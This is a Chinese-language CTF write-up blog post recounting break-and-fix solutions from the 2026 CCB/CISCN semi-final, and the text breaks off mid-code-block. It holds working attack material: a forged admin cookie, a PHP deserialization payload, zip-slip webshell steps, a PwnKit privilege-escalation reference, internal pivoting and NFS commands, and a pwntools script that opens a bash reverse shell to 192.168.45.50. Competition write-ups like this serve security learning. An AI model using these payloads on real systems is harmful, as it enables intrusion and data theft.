@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2026ccb&amp;ciscn半决 靠学长带飞进国决了，记录一下经验\nAWDP EasyTime break\n这里双重md5，拿字典爆破出密码是secret,然后可以登入成admin\n不过这里其实可以直接改cookie\n">
+<title>2026ccb&amp;ciscn半决经验总结</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2026ccb&ciscn半决经验总结">
+<meta property='og:description' content="2026ccb&amp;ciscn半决 靠学长带飞进国决了，记录一下经验\nAWDP EasyTime break\n这里双重md5，拿字典爆破出密码是secret,然后可以登入成admin\n不过这里其实可以直接改cookie\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2026-03-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-23T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/1.jpg' />
+<meta name="twitter:title" content="2026ccb&ciscn半决经验总结">
+<meta name="twitter:description" content="2026ccb&amp;ciscn半决 靠学长带飞进国决了，记录一下经验\nAWDP EasyTime break\n这里双重md5，拿字典爆破出密码是secret,然后可以登入成admin\n不过这里其实可以直接改cookie\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/1.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#awdp">AWDP</a>
+      <ol>
+        <li><a href="#easytime">EasyTime</a></li>
+        <li><a href="#mediadrive">MediaDrive</a></li>
+      </ol>
+    </li>
+    <li><a href="#isw">ISW</a>
+      <ol>
+        <li><a href="#isw-1">ISW</a></li>
+        <li><a href="#isw1">ISW1</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                <img src="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/1.jpg"
+                        
+                        width="2196" 
+                        height="3073" 
+                        loading="lazy"
+                        alt="Featured image of post 2026ccb&amp;ciscn半决经验总结" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" style="background-color: #2a9d8f; color: #fff;">
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">2026ccb&amp;ciscn半决经验总结</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 23, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="2026ccbciscn半决">2026ccb&amp;ciscn半决
+</h1><p>靠学长带飞进国决了，记录一下经验</p>
+<h2 id="awdp">AWDP
+</h2><h3 id="easytime">EasyTime
+</h3><p><strong>break</strong></p>
+<p><img src="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323204655440.png"
+	width="933"
+	height="593"
+	srcset="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323204655440_hu14128536228153695181.png 480w, /p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323204655440_hu11434861032543239266.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260323204655440"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<p>这里双重md5，拿字典爆破出密码是secret,然后可以登入成admin</p>
+<p>不过这里其实可以直接改cookie</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Cookie: visited=yes; user=admin
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>也能成功以admin登入</p>
+<p><img src="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323205046834.png"
+	width="852"
+	height="846"
+	srcset="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323205046834_hu6189510555155704662.png 480w, /p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323205046834_hu1434758617450261664.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260323205046834"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="241px"
+	
+></p>
+<p>zipslip上传webshell,目录穿越写webshell到<code>/var/www/html</code>，然后ssrf，这里结合源码可以看到80端口还有php服务，直接访问webshell读tmp下flag</p>
+<p><strong>fix</strong></p>
+<p>没fix上，这里其实想到要杀进程，重启服务使得flask起的py重启成我们写的py，但是没成功</p>
+<p>修复的话参考0rays的wp，他们是改secretkey和cookie的字段名，然后把zip上传的方法修改一下</p>
+<p><img src="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323211603517.png"
+	width="737"
+	height="610"
+	srcset="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323211603517_hu1448498697836469834.png 480w, /p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323211603517_hu5609284469251886903.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260323211603517"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="120"
+		data-flex-basis="289px"
+	
+></p>
+<p>这里服务是会被supervisord自动重启的，不能杀python3，用pkill单杀一个index.py进程就修成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>mv index.py /app/index.py
+</span></span><span class="line"><span class="cl">pkill -f <span class="s2">&#34;/app/index.py&#34;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="mediadrive">MediaDrive
+</h3><p>比较简单的题</p>
+<p><strong>break</strong></p>
+<p>反序列化改cookie就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">O:</span><span class="mi">4</span><span class="err">:</span><span class="s2">&#34;User&#34;</span><span class="err">:</span><span class="mi">3</span><span class="err">:</span><span class="p">{</span><span class="err">s:4:</span><span class="nt">&#34;name&#34;</span><span class="err">;s</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="s2">&#34;guest&#34;</span><span class="err">;s</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="s2">&#34;encoding&#34;</span><span class="err">;s</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="s2">&#34;UTF-16BE&#34;</span><span class="err">;s</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="s2">&#34;basePath&#34;</span><span class="err">;s</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="err">;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>utf-16be编码传入<code>%00%2F%00f%00l%00a%00g</code>就读到flag了</p>
+<p>其他编码应该也行</p>
+<p><strong>fix</strong></p>
+<p>User.php类里加个wakeup方法把encoding改为utf-8，basedir改为/var/www/html/uploads即可</p>
+<p>更变态的是通防能直接防住https://github.com/leohearts/awd-watchbird</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">cp ./waf.so /var/www/html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cp ./watchbird.php /var/www/html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">php /var/www/html/watchbird.php --install /var/www/html/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="isw">ISW
+</h2><p>可能每个人序号不同</p>
+<h3 id="isw-1">ISW
+</h3><p>fscan扫出shirokey，拿工具一把梭，打入内存马到内网，扫描一下发现192.168.45.100这个，stowaway搭内网穿透</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 cme smb 192.168.45.100 --users
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>枚举用户直接就能找到一个flag用户，拿到flag，这个赛区一血</p>
+<p>后面听别的师傅说suid能提权，pkexec用先知之前的cve是能提权的，这里也有一个flag</p>
+<p>CVE-2021-4034是能用工具pwnkit提权的https://github.com/ly4k/PwnKit</p>
+<p>内网的<code>192.168.45.100</code>还有很多端口开放</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.45.100:88 open
+</span></span><span class="line"><span class="cl">192.168.45.100:53 open
+</span></span><span class="line"><span class="cl">192.168.45.100:22 open
+</span></span><span class="line"><span class="cl">192.168.45.100:139 open
+</span></span><span class="line"><span class="cl">192.168.45.100:135 open
+</span></span><span class="line"><span class="cl">192.168.45.100:111 open
+</span></span><span class="line"><span class="cl">192.168.45.100:464 open
+</span></span><span class="line"><span class="cl">192.168.45.100:445 open
+</span></span><span class="line"><span class="cl">192.168.45.100:389 open
+</span></span><span class="line"><span class="cl">192.168.45.100:636 open
+</span></span><span class="line"><span class="cl">192.168.45.100:2049 open
+</span></span><span class="line"><span class="cl">192.168.45.100:3269 open
+</span></span><span class="line"><span class="cl">192.168.45.100:3268 open
+</span></span><span class="line"><span class="cl">192.168.45.100:12345 open
+</span></span><span class="line"><span class="cl">192.168.45.100:20048 open
+</span></span><span class="line"><span class="cl">192.168.45.100:34483 open
+</span></span><span class="line"><span class="cl">192.168.45.100:49154 open
+</span></span><span class="line"><span class="cl">192.168.45.100:49153 open
+</span></span><span class="line"><span class="cl">192.168.45.100:49152 open
+</span></span><span class="line"><span class="cl">192.168.45.100:57291 open
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的2049端口是nfs服务端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 showmount -e 192.168.45.100 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">结果为:
+</span></span><span class="line"><span class="cl">Export list <span class="k">for</span> 192.168.45.100:
+</span></span><span class="line"><span class="cl">/nfsdir *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>挂载上面目录就能拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /hack
+</span></span><span class="line"><span class="cl">mount -t 192.168.45.100:/nfsdir /hack -o nolock
+</span></span><span class="line"><span class="cl">cat /hack/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这里还有12345端口，外面的机器<code>192.168.45.50</code>拿到root后也有一个agent服务监听12345端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.45.100&#39;</span><span class="p">,</span><span class="mi">12345</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;RCE_AUTH_2026&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.45.50/4444 0&gt;&amp;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>反弹shell就能拿到flag</p>
+<p>这里弹shell之后，再进行内网扫描，是能扫到<code>192.168.77.45</code>这台机子开80服务的，应该就是最后一个flag的位置了</p>
+<h3 id="isw1">ISW1
+</h3><p>fscan扫到一个目录穿越的poc，测试一血确实存在，后面探测半天觉得是pwn，给pwn手没成功利用打rop就没下文了，不过看0rays他们的wp是能栈迁移到堆上rop，写私钥连靶机</p>
+<p>不过别的师傅好像通过取证方式也能做，任意文件读到/dev/sda3</p>
+<p>Linux中硬盘以及分区等设备均表示为文件，其命名规则如下：</p>
+<ul>
+<li>IDE磁盘的文件名为：/dev/hdxx</li>
+<li>SCSI/SATA/USB磁盘文件名为：/dev/sdxx</li>
+</ul>
+<p><img src="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323221009327.png"
+	width="704"
+	height="691"
+	srcset="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323221009327_hu12697704556159372800.png 480w, /p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/image-20260323221009327_hu17591486457633684560.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260323221009327"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="101"
+		data-flex-basis="244px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/dev/hda      <span class="c1">#表示第一个IDE硬盘</span>
+</span></span><span class="line"><span class="cl">/dev/hda1     <span class="c1">#表示第一块IDE硬盘的第一个主分区</span>
+</span></span><span class="line"><span class="cl">/dev/hda2     <span class="c1">#表示第一块IDE硬盘的扩展分区（或第二个主分区）</span>
+</span></span><span class="line"><span class="cl">/dev/hda5     <span class="c1">#表示第一块IDE硬盘的第一个逻辑分区</span>
+</span></span><span class="line"><span class="cl">/dev/hda8     <span class="c1">#表示第一块IDE硬盘的第四个逻辑分区</span>
+</span></span><span class="line"><span class="cl">/dev/hdb      <span class="c1">#表示第二个IDE硬盘</span>
+</span></span><span class="line"><span class="cl">/dev/sda      <span class="c1">#表示第一个SCSI硬盘</span>
+</span></span><span class="line"><span class="cl">/dev/sda1     <span class="c1">#表示第一个SCSI硬盘的第一个主分区</span>
+</span></span><span class="line"><span class="cl">/dev/sdd3     <span class="c1">#表示第四个SCSI硬盘的第三个主分区</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>具体知道挂载在哪里还是要查看<code>/etc/fstab</code></p>
+<p>比如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/fstab
+</span></span><span class="line"><span class="cl"><span class="c1"># &lt;file system&gt;        &lt;dir&gt;         &lt;type&gt;    &lt;options&gt;             &lt;dump&gt; &lt;pass&gt;</span>
